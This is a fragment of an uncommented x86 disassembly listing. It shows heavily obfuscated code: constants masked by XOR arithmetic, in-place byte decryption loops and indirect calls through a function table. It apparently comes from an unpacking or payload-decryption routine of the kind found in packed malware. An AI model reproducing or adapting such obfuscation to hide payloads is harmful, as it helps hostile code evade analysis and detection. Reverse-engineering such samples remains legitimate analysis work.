  426674:	mov    DWORD PTR [ebp-0x1c],eax
  426677:	mov    eax,DWORD PTR [ebp-0x34]
  42667a:	test   eax,eax
  42667c:	je     0x426690
  42667e:	mov    eax,DWORD PTR [ebp-0x18]
  426681:	mov    ecx,DWORD PTR [ebp-0x38]
  426684:	xor    eax,ebx
  426686:	lea    eax,[eax+ecx*1+0x3272f5]
  42668d:	mov    DWORD PTR [ebp-0x38],eax
  426690:	mov    eax,DWORD PTR [ebp-0x18]
  426693:	xor    eax,ebx
  426695:	mov    ecx,0xffcd8d0b
  42669a:	sub    ecx,eax
  42669c:	add    ecx,DWORD PTR [ebp-0x28]
  42669f:	mov    eax,DWORD PTR [ebp-0x1c]
  4266a2:	cmp    eax,ecx
  4266a4:	jbe    0x426509
  4266aa:	mov    esi,edi
  4266ac:	mov    eax,DWORD PTR [ebp-0x38]
  4266af:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266b2:	cmp    ecx,eax
  4266b4:	jne    0x4266c7
  4266b6:	push   DWORD PTR [ebp+0x8]
  4266b9:	lea    eax,[ebp-0x40]
  4266bc:	push   eax
  4266bd:	call   0x42920e
  4266c2:	mov    DWORD PTR [ebp-0x24],eax
  4266c5:	jmp    0x4266d3
  4266c7:	mov    eax,DWORD PTR [ebp-0x24]
  4266ca:	mov    ecx,DWORD PTR [ebp-0x18]
  4266cd:	xor    ecx,ebx
  4266cf:	add    ecx,esi
  4266d1:	xor    DWORD PTR [eax],ecx
  4266d3:	mov    eax,DWORD PTR [ebp-0x10]
  4266d6:	mov    ecx,DWORD PTR [ebp-0x24]
  4266d9:	xor    eax,ebx
  4266db:	add    eax,esi
  4266dd:	cmp    eax,ecx
  4266df:	je     0x426e57
  4266e5:	mov    eax,DWORD PTR [ebp-0x10]
  4266e8:	mov    ecx,DWORD PTR [ebp-0x40]
  4266eb:	xor    eax,ebx
  4266ed:	add    eax,esi
  4266ef:	cmp    eax,ecx
  4266f1:	je     0x426e57
  4266f7:	mov    eax,DWORD PTR [ebp-0x10]
  4266fa:	xor    eax,ebx
  4266fc:	add    eax,esi
  4266fe:	jmp    0x42671c
  426700:	mov    edi,DWORD PTR [ebp-0x24]
  426703:	mov    cl,al
  426705:	and    cl,0x1f
  426708:	or     dl,0xff
  42670b:	sub    dl,cl
  42670d:	add    BYTE PTR [edi+eax*1],dl
  426710:	mov    ecx,DWORD PTR [ebp-0x18]
  426713:	xor    ecx,ebx
  426715:	lea    eax,[eax+ecx*1+0x3272f5]
  42671c:	mov    ecx,DWORD PTR [ebp-0x40]
  42671f:	cmp    eax,ecx
  426721:	jb     0x426700
  426723:	mov    eax,DWORD PTR [ebp-0x40]
  426726:	mov    DWORD PTR [ebp-0x28],eax
  426729:	mov    eax,DWORD PTR [ebp-0x24]
  42672c:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  426733:	mov    DWORD PTR [ebp-0xd4],eax
  426739:	mov    edi,0xf89c85a2
  42673e:	mov    DWORD PTR [ebp-0x2c],edi
  426741:	mov    eax,DWORD PTR [ebp-0x38]
  426744:	xor    eax,ebx
  426746:	add    eax,esi
  426748:	mov    DWORD PTR [ebp-0xc],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x38]
  42674e:	xor    eax,ebx
  426750:	add    eax,esi
  426752:	mov    DWORD PTR [ebp-0x8],eax
  426755:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42675c:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426763:	mov    eax,DWORD PTR [ebp-0x38]
  426766:	mov    ecx,DWORD PTR [ebp-0x28]
  426769:	xor    eax,ebx
  42676b:	add    eax,esi
  42676d:	cmp    ecx,eax
  42676f:	je     0x42696e
  426775:	jmp    0x42694a
  42677a:	mov    ecx,DWORD PTR [ebp-0xc]
  42677d:	mov    eax,DWORD PTR [ebp-0x28]
  426780:	sub    eax,ecx
  426782:	mov    ecx,DWORD PTR [ebp-0x48]
  426785:	xor    ecx,ebx
  426787:	add    ecx,esi
  426789:	xor    edx,edx
  42678b:	div    ecx
  42678d:	mov    DWORD PTR [ebp-0x8],eax
  426790:	mov    eax,DWORD PTR [ebp-0x4c]
  426793:	mov    ecx,DWORD PTR [ebp-0x8]
  426796:	xor    eax,ebx
  426798:	add    eax,esi
  42679a:	cmp    ecx,eax
  42679c:	jbe    0x4267a8
  42679e:	mov    eax,DWORD PTR [ebp-0x4c]
  4267a1:	xor    eax,ebx
  4267a3:	add    eax,esi
  4267a5:	mov    DWORD PTR [ebp-0x8],eax
  4267a8:	mov    eax,DWORD PTR [ebp-0x48]
  4267ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4267ae:	xor    eax,ebx
  4267b0:	add    eax,esi
  4267b2:	imul   eax,ecx
  4267b5:	mov    DWORD PTR [ebp-0x8],eax
  4267b8:	mov    eax,DWORD PTR [ebp-0x38]
  4267bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4267be:	xor    eax,ebx
  4267c0:	add    eax,esi
  4267c2:	cmp    ecx,eax
  4267c4:	je     0x426938
  4267ca:	mov    eax,DWORD PTR [ebp-0x8]
  4267cd:	mov    DWORD PTR [ebp-0x14],eax
  4267d0:	mov    eax,DWORD PTR [ebp-0xc]
  4267d3:	add    eax,DWORD PTR [ebp-0xd4]
  4267d9:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  4267e0:	mov    DWORD PTR [ebp-0x34],edi
  4267e3:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  4267ed:	mov    DWORD PTR [ebp-0x8],eax
  4267f0:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  4267f7:	mov    DWORD PTR [ebp-0x1c],edi
  4267fa:	mov    eax,DWORD PTR [ebp-0x20]
  4267fd:	xor    eax,ebx
  4267ff:	add    eax,esi
  426801:	jmp    0x4268f7
  426806:	mov    DWORD PTR [ebp-0xe0],0xf89c85b8
  426810:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42681a:	mov    eax,DWORD PTR [ebp-0x1c]
  42681d:	mov    ecx,DWORD PTR [ebp-0x44]
  426820:	xor    eax,ebx
  426822:	add    eax,esi
  426824:	imul   eax,ecx
  426827:	mov    ecx,DWORD PTR [ebp-0x8]
  42682a:	mov    al,BYTE PTR [eax+ecx*1]
  42682d:	mov    BYTE PTR [ebp-0x2],al
  426830:	mov    eax,DWORD PTR [ebp-0x1c]
  426833:	mov    ecx,DWORD PTR [ebp-0x44]
  426836:	xor    eax,ebx
  426838:	add    eax,esi
  42683a:	imul   eax,ecx
  42683d:	mov    ecx,DWORD PTR [ebp-0xe8]
  426843:	xor    ecx,ebx
  426845:	add    eax,ecx
  426847:	mov    ecx,DWORD PTR [ebp-0x8]
  42684a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426852:	mov    ecx,DWORD PTR [ebp-0xe0]
  426858:	xor    ecx,ebx
  42685a:	lea    eax,[ecx+eax*1+0x3272f5]
  426861:	movzx  ecx,BYTE PTR [ebp-0x2]
  426865:	xor    ecx,eax
  426867:	mov    BYTE PTR [ebp-0x2],cl
  42686a:	mov    al,BYTE PTR [ebp-0x2]
  42686d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426870:	mov    edx,DWORD PTR [ebp-0x44]
  426873:	xor    ecx,ebx
  426875:	add    ecx,esi
  426877:	imul   ecx,edx
  42687a:	mov    edx,DWORD PTR [ebp-0x8]
  42687d:	mov    BYTE PTR [ecx+edx*1],al
  426880:	mov    eax,DWORD PTR [ebp-0x1c]
  426883:	mov    ecx,DWORD PTR [ebp-0x44]
  426886:	xor    eax,ebx
  426888:	add    eax,esi
  42688a:	imul   eax,ecx
  42688d:	mov    ecx,DWORD PTR [ebp-0x8]
  426890:	mov    al,BYTE PTR [eax+ecx*1]
  426893:	mov    BYTE PTR [ebp-0x2],al
  426896:	mov    eax,DWORD PTR [ebp-0x1c]
  426899:	mov    ecx,DWORD PTR [ebp-0x44]
  42689c:	xor    eax,ebx
  42689e:	add    eax,esi
  4268a0:	imul   eax,ecx
  4268a3:	mov    ecx,DWORD PTR [ebp-0x34]
  4268a6:	xor    ecx,ebx
  4268a8:	add    eax,ecx
  4268aa:	mov    ecx,DWORD PTR [ebp-0x8]
  4268ad:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  4268b5:	mov    ecx,DWORD PTR [ebp-0xc4]
  4268bb:	xor    ecx,ebx
  4268bd:	lea    eax,[ecx+eax*1+0x3272f5]
  4268c4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4268c8:	xor    ecx,eax
  4268ca:	mov    BYTE PTR [ebp-0x2],cl
  4268cd:	mov    al,BYTE PTR [ebp-0x2]
  4268d0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268d3:	mov    edx,DWORD PTR [ebp-0x44]
  4268d6:	xor    ecx,ebx
  4268d8:	add    ecx,esi
  4268da:	imul   ecx,edx
  4268dd:	mov    edx,DWORD PTR [ebp-0x8]
  4268e0:	mov    BYTE PTR [ecx+edx*1],al
  4268e3:	mov    eax,DWORD PTR [ebp-0x30]
  4268e6:	mov    ecx,DWORD PTR [ebp-0x34]
  4268e9:	xor    eax,ebx
  4268eb:	xor    ecx,ebx
  4268ed:	add    eax,esi
  4268ef:	add    ecx,esi
  4268f1:	imul   eax,ecx
  4268f4:	add    eax,DWORD PTR [ebp-0x44]
  4268f7:	mov    DWORD PTR [ebp-0x44],eax
  4268fa:	mov    eax,DWORD PTR [ebp-0x44]
  4268fd:	mov    ecx,DWORD PTR [ebp-0x14]
  426900:	cmp    ecx,eax
  426902:	jb     0x426806
  426908:	mov    eax,DWORD PTR [ebp-0x34]
  42690b:	mov    ecx,DWORD PTR [ebp-0x14]
  42690e:	xor    eax,ebx
  426910:	add    eax,esi
  426912:	imul   eax,ecx
  426915:	mov    ecx,DWORD PTR [ebp-0x20]
  426918:	xor    ecx,ebx
  42691a:	add    ecx,esi
  42691c:	or     eax,ecx
  42691e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426921:	xor    ecx,ebx
  426923:	add    eax,ecx
  426925:	mov    ecx,DWORD PTR [ebp-0x2c]
  426928:	xor    ecx,ebx
  42692a:	add    eax,ecx
  42692c:	mov    ecx,DWORD PTR [ebp-0xc]
  42692f:	lea    eax,[eax+ecx*1+0x64e5ea]
  426936:	jmp    0x426947
  426938:	mov    eax,DWORD PTR [ebp-0x2c]
  42693b:	mov    ecx,DWORD PTR [ebp-0xc]
  42693e:	xor    eax,ebx
  426940:	lea    eax,[eax+ecx*1+0x3272f5]
  426947:	mov    DWORD PTR [ebp-0xc],eax
  42694a:	mov    eax,DWORD PTR [ebp-0x2c]
  42694d:	xor    eax,ebx
  42694f:	mov    ecx,0xffcd8d0b
  426954:	sub    ecx,eax
  426956:	add    ecx,DWORD PTR [ebp-0x28]
  426959:	mov    eax,DWORD PTR [ebp-0x2c]
  42695c:	mov    edx,DWORD PTR [ebp-0xc]
  42695f:	xor    eax,ebx
  426961:	add    eax,esi
  426963:	imul   eax,edx
  426966:	cmp    eax,ecx
  426968:	jbe    0x42677a
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	mov    ecx,DWORD PTR [ebp-0x40]
  426974:	mov    eax,DWORD PTR [ebp+0x8]
  426977:	mov    edx,DWORD PTR [ebp-0x54]
  42697a:	mov    eax,DWORD PTR [eax+0x1e0]
  426980:	xor    edx,ebx
  426982:	add    edx,esi
  426984:	push   edx
  426985:	mov    edx,DWORD PTR [ebp-0x3c]
  426988:	xor    edx,ebx
  42698a:	add    edx,esi
  42698c:	push   edx
  42698d:	push   ecx
  42698e:	mov    DWORD PTR [ebp-0x30],ecx
  426991:	mov    ecx,DWORD PTR [ebp-0x10]
  426994:	xor    ecx,ebx
  426996:	add    ecx,esi
  426998:	push   ecx
  426999:	call   DWORD PTR [eax+0x14]
  42699c:	mov    edi,eax
  42699e:	mov    eax,DWORD PTR [ebp-0x10]
  4269a1:	xor    eax,ebx
  4269a3:	add    eax,esi
  4269a5:	cmp    eax,edi
  4269a7:	je     0x426a02
  4269a9:	mov    eax,DWORD PTR [ebp-0x10]
  4269ac:	jmp    0x4269cf
  4269ae:	mov    ecx,DWORD PTR [ebp-0x24]
  4269b1:	xor    eax,ebx
  4269b3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f5]
  4269ba:	mov    BYTE PTR [eax+edi*1+0x3272f5],cl
  4269c1:	mov    ecx,DWORD PTR [ebp-0x18]
  4269c4:	xor    ecx,ebx
  4269c6:	lea    eax,[ecx+eax*1+0x3272f5]
  4269cd:	xor    eax,ebx
  4269cf:	mov    ecx,DWORD PTR [ebp-0x40]
  4269d2:	sub    ecx,esi
  4269d4:	xor    ecx,ebx
  4269d6:	cmp    eax,ecx
  4269d8:	jne    0x4269ae
  4269da:	mov    eax,DWORD PTR [ebp+0x8]
  4269dd:	mov    ecx,DWORD PTR [ebp-0x50]
  4269e0:	mov    eax,DWORD PTR [eax+0x1e0]
  4269e6:	xor    ecx,ebx
  4269e8:	add    ecx,esi
  4269ea:	push   ecx
  4269eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4269ee:	xor    ecx,ebx
  4269f0:	add    ecx,esi
  4269f2:	push   ecx
  4269f3:	push   DWORD PTR [ebp-0x24]
  4269f6:	call   DWORD PTR [eax+0x18]
  4269f9:	mov    eax,DWORD PTR [ebp-0x30]
  4269fc:	mov    DWORD PTR [ebp-0x24],edi
  4269ff:	mov    DWORD PTR [ebp-0x40],eax
  426a02:	mov    edi,DWORD PTR [ebp-0x24]
  426a05:	mov    eax,DWORD PTR [ebp-0x18]
  426a08:	mov    ecx,DWORD PTR [ebp-0x10]
  426a0b:	xor    eax,ebx
  426a0d:	mov    DWORD PTR [ebp-0x30],edi
  426a10:	add    eax,esi
  426a12:	mov    DWORD PTR [ebp-0x5c],0x402b332b
  426a19:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426a20:	jmp    0x426a54
  426a22:	xor    ecx,ebx
  426a24:	mov    dl,BYTE PTR [ebp+ecx*1+0x327299]
  426a2b:	xor    dl,0x7e
  426a2e:	add    dl,0x3
  426a31:	mov    DWORD PTR [ebp-0x3c],ecx
  426a34:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f5]
  426a3c:	movzx  edx,dl
  426a3f:	cmp    ecx,edx
  426a41:	jne    0x426a5e
  426a43:	mov    ecx,DWORD PTR [ebp-0x18]
  426a46:	mov    edx,DWORD PTR [ebp-0x3c]
  426a49:	xor    ecx,ebx
  426a4b:	lea    ecx,[ecx+edx*1+0x3272f5]
  426a52:	xor    ecx,ebx
  426a54:	cmp    ecx,0xf89c85bd
  426a5a:	jne    0x426a22
  426a5c:	jmp    0x426a65
  426a5e:	mov    eax,DWORD PTR [ebp-0x10]
  426a61:	xor    eax,ebx
  426a63:	add    eax,esi
  426a65:	mov    ecx,DWORD PTR [ebp-0x10]
  426a68:	xor    ecx,ebx
  426a6a:	add    ecx,esi
  426a6c:	cmp    ecx,eax
  426a6e:	je     0x426be1
  426a74:	mov    eax,DWORD PTR [edi+0x8]
  426a77:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426a7e:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426a85:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  426a8c:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  426a93:	mov    DWORD PTR [ebp-0x14],eax
  426a96:	mov    eax,DWORD PTR [ebp+0x8]
  426a99:	mov    ecx,DWORD PTR [ebp-0x20]
  426a9c:	xor    ecx,ebx
  426a9e:	add    ecx,esi
  426aa0:	push   ecx
  426aa1:	mov    ecx,DWORD PTR [ebp-0x48]
  426aa4:	mov    eax,DWORD PTR [eax+0x1e0]
  426aaa:	xor    ecx,ebx
  426aac:	add    ecx,esi
  426aae:	push   ecx
  426aaf:	mov    ecx,DWORD PTR [ebp-0x3c]
  426ab2:	xor    ecx,ebx
  426ab4:	add    ecx,esi
  426ab6:	push   ecx
  426ab7:	mov    ecx,DWORD PTR [ebp-0xc]
  426aba:	xor    ecx,ebx
  426abc:	add    ecx,esi
  426abe:	push   ecx
  426abf:	call   DWORD PTR [eax+0x14]
  426ac2:	mov    edi,eax
  426ac4:	mov    eax,DWORD PTR [ebp+0x8]
  426ac7:	mov    ecx,DWORD PTR [ebp-0x20]
  426aca:	mov    eax,DWORD PTR [eax+0x1e0]
  426ad0:	xor    ecx,ebx
  426ad2:	add    ecx,esi
  426ad4:	push   ecx
  426ad5:	mov    ecx,DWORD PTR [ebp-0x48]
  426ad8:	xor    ecx,ebx
  426ada:	add    ecx,esi
  426adc:	push   ecx
  426add:	mov    ecx,DWORD PTR [ebp-0xc]
  426ae0:	push   DWORD PTR [ebp-0x14]
  426ae3:	xor    ecx,ebx
  426ae5:	add    ecx,esi
  426ae7:	push   ecx
  426ae8:	call   DWORD PTR [eax+0x14]
  426aeb:	mov    ecx,DWORD PTR [ebp-0xc]
  426aee:	xor    ecx,ebx
  426af0:	add    ecx,esi
  426af2:	mov    DWORD PTR [ebp-0x20],eax
  426af5:	cmp    ecx,edi
  426af7:	je     0x426e84
  426afd:	mov    ecx,DWORD PTR [ebp-0xc]
  426b00:	xor    ecx,ebx
  426b02:	add    ecx,esi
  426b04:	cmp    ecx,eax
  426b06:	je     0x426e84
  426b0c:	mov    DWORD PTR [ebp-0x3c],0xf89c85a0
  426b13:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426b1a:	mov    ecx,DWORD PTR [ebp-0x3c]
  426b1d:	xor    cl,0xae
  426b20:	sub    cl,0xb
  426b23:	mov    BYTE PTR [edi],cl
  426b25:	mov    ecx,DWORD PTR [ebp-0xc]
  426b28:	xor    cl,0xae
  426b2b:	sub    cl,0xb
  426b2e:	mov    BYTE PTR [edi+0x1],cl
  426b31:	mov    ecx,DWORD PTR [ebp-0x54]
  426b34:	xor    cl,0xae
  426b37:	sub    cl,0xb
  426b3a:	mov    BYTE PTR [edi+0x2],cl
  426b3d:	and    DWORD PTR [ebp-0xc8],0x0
  426b44:	and    DWORD PTR [ebp-0xdc],0x0
  426b4b:	lea    ecx,[ebp-0xdc]
  426b51:	push   ecx
  426b52:	push   DWORD PTR [ebp-0x14]
  426b55:	push   eax
  426b56:	lea    eax,[ebp-0xc8]
  426b5c:	push   eax
  426b5d:	mov    eax,DWORD PTR [ebp-0x30]
  426b60:	push   DWORD PTR [eax+0xc]
  426b63:	mov    eax,DWORD PTR [ebp-0x24]
  426b66:	add    eax,0x10
  426b69:	push   eax
  426b6a:	push   edi
  426b6b:	call   0x425e11
  426b70:	mov    DWORD PTR [ebp-0x3c],eax
  426b73:	mov    eax,DWORD PTR [ebp+0x8]
  426b76:	mov    ecx,DWORD PTR [ebp-0x50]
  426b79:	mov    eax,DWORD PTR [eax+0x1e0]
  426b7f:	xor    ecx,ebx
  426b81:	add    ecx,esi
  426b83:	push   ecx
  426b84:	mov    ecx,DWORD PTR [ebp-0xc]
  426b87:	xor    ecx,ebx
  426b89:	add    ecx,esi
  426b8b:	push   ecx
  426b8c:	push   edi
  426b8d:	call   DWORD PTR [eax+0x18]
  426b90:	mov    eax,DWORD PTR [ebp-0x3c]
  426b93:	add    eax,0xffcd8d0b
  426b98:	xor    eax,ebx
  426b9a:	cmp    eax,0xf89c85a5
  426b9f:	mov    eax,DWORD PTR [ebp+0x8]
  426ba2:	mov    eax,DWORD PTR [eax+0x1e0]
  426ba8:	mov    ecx,DWORD PTR [ebp-0x50]
  426bab:	jne    0x426bce
  426bad:	xor    ecx,ebx
  426baf:	add    ecx,esi
  426bb1:	push   ecx
  426bb2:	mov    ecx,DWORD PTR [ebp-0xc]
  426bb5:	xor    ecx,ebx
  426bb7:	add    ecx,esi
  426bb9:	push   ecx
  426bba:	push   DWORD PTR [ebp-0x24]
  426bbd:	call   DWORD PTR [eax+0x18]
  426bc0:	mov    eax,DWORD PTR [ebp-0x20]
  426bc3:	mov    DWORD PTR [ebp-0x24],eax
  426bc6:	mov    eax,DWORD PTR [ebp-0x14]
  426bc9:	mov    DWORD PTR [ebp-0x40],eax
  426bcc:	jmp    0x426be1
  426bce:	xor    ecx,ebx
  426bd0:	add    ecx,esi
  426bd2:	push   ecx
  426bd3:	mov    ecx,DWORD PTR [ebp-0xc]
  426bd6:	xor    ecx,ebx
  426bd8:	add    ecx,esi
  426bda:	push   ecx
  426bdb:	push   DWORD PTR [ebp-0x20]
  426bde:	call   DWORD PTR [eax+0x18]
  426be1:	mov    eax,DWORD PTR [ebp-0x40]
  426be4:	mov    DWORD PTR [ebp-0x38],eax
  426be7:	mov    eax,DWORD PTR [ebp-0x24]
  426bea:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426bf1:	mov    DWORD PTR [ebp-0x3c],eax
  426bf4:	mov    edi,0xf89c85a2
  426bf9:	mov    DWORD PTR [ebp-0x2c],edi
  426bfc:	mov    eax,DWORD PTR [ebp-0x28]
  426bff:	xor    eax,ebx
  426c01:	add    eax,esi
  426c03:	mov    DWORD PTR [ebp-0xc],eax
  426c06:	mov    eax,DWORD PTR [ebp-0x28]
  426c09:	xor    eax,ebx
  426c0b:	add    eax,esi
  426c0d:	mov    DWORD PTR [ebp-0x14],eax
  426c10:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426c17:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426c1e:	mov    eax,DWORD PTR [ebp-0x28]
  426c21:	mov    ecx,DWORD PTR [ebp-0x38]
  426c24:	xor    eax,ebx
  426c26:	add    eax,esi
  426c28:	cmp    ecx,eax
  426c2a:	je     0x426e20
  426c30:	jmp    0x426dfc
  426c35:	mov    ecx,DWORD PTR [ebp-0xc]
  426c38:	mov    eax,DWORD PTR [ebp-0x38]
  426c3b:	sub    eax,ecx
  426c3d:	mov    ecx,DWORD PTR [ebp-0x48]
  426c40:	xor    ecx,ebx
  426c42:	add    ecx,esi
  426c44:	xor    edx,edx
  426c46:	div    ecx
  426c48:	mov    DWORD PTR [ebp-0x14],eax
  426c4b:	mov    eax,DWORD PTR [ebp-0x20]
  426c4e:	mov    ecx,DWORD PTR [ebp-0x14]
  426c51:	xor    eax,ebx
  426c53:	add    eax,esi
  426c55:	cmp    ecx,eax
  426c57:	jbe    0x426c63
  426c59:	mov    eax,DWORD PTR [ebp-0x20]
  426c5c:	xor    eax,ebx
  426c5e:	add    eax,esi
  426c60:	mov    DWORD PTR [ebp-0x14],eax
  426c63:	mov    eax,DWORD PTR [ebp-0x48]
  426c66:	mov    ecx,DWORD PTR [ebp-0x14]
  426c69:	xor    eax,ebx
  426c6b:	add    eax,esi
  426c6d:	imul   eax,ecx
  426c70:	mov    DWORD PTR [ebp-0x14],eax
  426c73:	mov    eax,DWORD PTR [ebp-0x28]
  426c76:	mov    ecx,DWORD PTR [ebp-0x14]
  426c79:	xor    eax,ebx
  426c7b:	add    eax,esi
  426c7d:	cmp    ecx,eax
  426c7f:	je     0x426dea
  426c85:	mov    eax,DWORD PTR [ebp-0x14]
  426c88:	mov    DWORD PTR [ebp-0x34],eax
  426c8b:	mov    eax,DWORD PTR [ebp-0xc]
  426c8e:	add    eax,DWORD PTR [ebp-0x3c]
  426c91:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  426c98:	mov    DWORD PTR [ebp-0x14],edi
  426c9b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426ca2:	mov    DWORD PTR [ebp-0x1c],eax
  426ca5:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426cac:	mov    DWORD PTR [ebp-0x8],edi
  426caf:	mov    eax,DWORD PTR [ebp-0x4c]
  426cb2:	xor    eax,ebx
  426cb4:	add    eax,esi
  426cb6:	jmp    0x426da9
  426cbb:	mov    DWORD PTR [ebp-0xe4],0xf89c85b8
  426cc5:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426ccf:	mov    eax,DWORD PTR [ebp-0x8]
  426cd2:	mov    ecx,DWORD PTR [ebp-0x18]
  426cd5:	xor    eax,ebx
  426cd7:	add    eax,esi
  426cd9:	imul   eax,ecx
  426cdc:	mov    ecx,DWORD PTR [ebp-0x1c]
  426cdf:	mov    al,BYTE PTR [eax+ecx*1]
  426ce2:	mov    BYTE PTR [ebp-0x1],al
  426ce5:	mov    eax,DWORD PTR [ebp-0x8]
  426ce8:	mov    ecx,DWORD PTR [ebp-0x18]
  426ceb:	xor    eax,ebx
  426ced:	add    eax,esi
  426cef:	imul   eax,ecx
  426cf2:	mov    ecx,DWORD PTR [ebp-0x54]
  426cf5:	xor    ecx,ebx
  426cf7:	add    eax,ecx
  426cf9:	mov    ecx,DWORD PTR [ebp-0x1c]
  426cfc:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d04:	mov    ecx,DWORD PTR [ebp-0xe4]
  426d0a:	xor    ecx,ebx
  426d0c:	lea    eax,[ecx+eax*1+0x3272f5]
  426d13:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d17:	xor    ecx,eax
  426d19:	mov    BYTE PTR [ebp-0x1],cl
  426d1c:	mov    al,BYTE PTR [ebp-0x1]
  426d1f:	mov    ecx,DWORD PTR [ebp-0x8]
  426d22:	mov    edx,DWORD PTR [ebp-0x18]
  426d25:	xor    ecx,ebx
  426d27:	add    ecx,esi
  426d29:	imul   ecx,edx
  426d2c:	mov    edx,DWORD PTR [ebp-0x1c]
  426d2f:	mov    BYTE PTR [ecx+edx*1],al
  426d32:	mov    eax,DWORD PTR [ebp-0x8]
  426d35:	mov    ecx,DWORD PTR [ebp-0x18]
  426d38:	xor    eax,ebx
  426d3a:	add    eax,esi
  426d3c:	imul   eax,ecx
  426d3f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d42:	mov    al,BYTE PTR [eax+ecx*1]
  426d45:	mov    BYTE PTR [ebp-0x1],al
  426d48:	mov    eax,DWORD PTR [ebp-0x8]
  426d4b:	mov    ecx,DWORD PTR [ebp-0x18]
  426d4e:	xor    eax,ebx
  426d50:	add    eax,esi
  426d52:	imul   eax,ecx
  426d55:	mov    ecx,DWORD PTR [ebp-0x14]
  426d58:	xor    ecx,ebx
  426d5a:	add    eax,ecx
  426d5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d5f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d67:	mov    ecx,DWORD PTR [ebp-0xd0]
  426d6d:	xor    ecx,ebx
  426d6f:	lea    eax,[ecx+eax*1+0x3272f5]
  426d76:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d7a:	xor    ecx,eax
  426d7c:	mov    BYTE PTR [ebp-0x1],cl
  426d7f:	mov    al,BYTE PTR [ebp-0x1]
  426d82:	mov    ecx,DWORD PTR [ebp-0x8]
  426d85:	mov    edx,DWORD PTR [ebp-0x18]
  426d88:	xor    ecx,ebx
  426d8a:	add    ecx,esi
  426d8c:	imul   ecx,edx
  426d8f:	mov    edx,DWORD PTR [ebp-0x1c]
  426d92:	mov    BYTE PTR [ecx+edx*1],al
  426d95:	mov    eax,DWORD PTR [ebp-0x30]
  426d98:	mov    ecx,DWORD PTR [ebp-0x14]
  426d9b:	xor    eax,ebx
  426d9d:	xor    ecx,ebx
  426d9f:	add    eax,esi
  426da1:	add    ecx,esi
  426da3:	imul   eax,ecx
  426da6:	add    eax,DWORD PTR [ebp-0x18]
  426da9:	mov    DWORD PTR [ebp-0x18],eax
  426dac:	mov    eax,DWORD PTR [ebp-0x18]
  426daf:	mov    ecx,DWORD PTR [ebp-0x34]
  426db2:	cmp    ecx,eax
  426db4:	jb     0x426cbb
  426dba:	mov    eax,DWORD PTR [ebp-0x14]
  426dbd:	mov    ecx,DWORD PTR [ebp-0x34]
  426dc0:	xor    eax,ebx
  426dc2:	add    eax,esi
  426dc4:	imul   eax,ecx
  426dc7:	mov    ecx,DWORD PTR [ebp-0x4c]
  426dca:	xor    ecx,ebx
  426dcc:	add    ecx,esi
  426dce:	or     eax,ecx
  426dd0:	mov    ecx,DWORD PTR [ebp-0x2c]
  426dd3:	xor    ecx,ebx
  426dd5:	add    eax,ecx
  426dd7:	mov    ecx,DWORD PTR [ebp-0x2c]
  426dda:	xor    ecx,ebx
  426ddc:	add    eax,ecx
  426dde:	mov    ecx,DWORD PTR [ebp-0xc]
  426de1:	lea    eax,[eax+ecx*1+0x64e5ea]
  426de8:	jmp    0x426df9
  426dea:	mov    eax,DWORD PTR [ebp-0x2c]
  426ded:	mov    ecx,DWORD PTR [ebp-0xc]
  426df0:	xor    eax,ebx
  426df2:	lea    eax,[eax+ecx*1+0x3272f5]
  426df9:	mov    DWORD PTR [ebp-0xc],eax
  426dfc:	mov    eax,DWORD PTR [ebp-0x2c]
  426dff:	xor    eax,ebx
  426e01:	mov    ecx,0xffcd8d0b
  426e06:	sub    ecx,eax
  426e08:	add    ecx,DWORD PTR [ebp-0x38]
  426e0b:	mov    eax,DWORD PTR [ebp-0x2c]
  426e0e:	mov    edx,DWORD PTR [ebp-0xc]
  426e11:	xor    eax,ebx
  426e13:	add    eax,esi
  426e15:	imul   eax,edx
  426e18:	cmp    eax,ecx
  426e1a:	jbe    0x426c35
  426e20:	push   DWORD PTR [ebp+0x8]
  426e23:	mov    eax,DWORD PTR [ebp+0x8]
  426e26:	push   DWORD PTR [eax+0x1cc]
  426e2c:	lea    eax,[ebp-0xd8]
  426e32:	push   eax
  426e33:	mov    eax,DWORD PTR [ebp+0x8]
  426e36:	mov    eax,DWORD PTR [eax+0x1c4]
  426e3c:	push   DWORD PTR [eax]
  426e3e:	mov    eax,DWORD PTR [ebp+0x8]
  426e41:	mov    eax,DWORD PTR [eax+0x1c0]
  426e47:	push   DWORD PTR [eax]
  426e49:	push   DWORD PTR [ebp-0x40]
